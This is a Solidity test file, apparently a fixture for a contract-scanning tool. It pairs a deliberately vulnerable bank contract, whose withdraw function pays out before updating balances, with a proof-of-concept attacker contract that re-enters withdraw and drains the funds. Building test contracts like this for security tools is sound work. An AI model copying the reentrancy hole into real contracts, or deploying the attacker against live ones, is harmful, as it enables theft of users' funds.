// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

// DELIBERATELY VULNERABLE - SolGuard AI test contract
// Vulnerability: Reentrancy (CWE-841, SWC-107)
// DO NOT DEPLOY ON MAINNET

contract VulnerableBank {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    function deposit() public payable {
        require(msg.value > 0, "Must deposit ETH");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    // VULNERABILITY: External .call{value} BEFORE state update
    // Attack: Attacker fallback() re-enters withdraw() multiple times
    // Fix: Use CEI pattern + nonReentrant from OpenZeppelin ReentrancyGuard
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}(""); // BUG: call before update
        require(success, "Transfer failed");
        balances[msg.sender] -= amount; // Too late!
        emit Withdrawal(msg.sender, amount);
    }

    function getBalance(address user) public view returns (uint256) {
        return balances[user];
    }

    receive() external payable { deposit(); }
}

// PoC Attacker for Foundry/Hardhat testing
contract ReentrancyAttacker {
    VulnerableBank public target;
    uint256 public count;

    constructor(address _target) { target = VulnerableBank(_target); }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (count < 5 && address(target).balance >= 1 ether) {
            count++;
            target.withdraw(1 ether);
        }
    }

    function drain() external { payable(msg.sender).transfer(address(this).balance); }
}
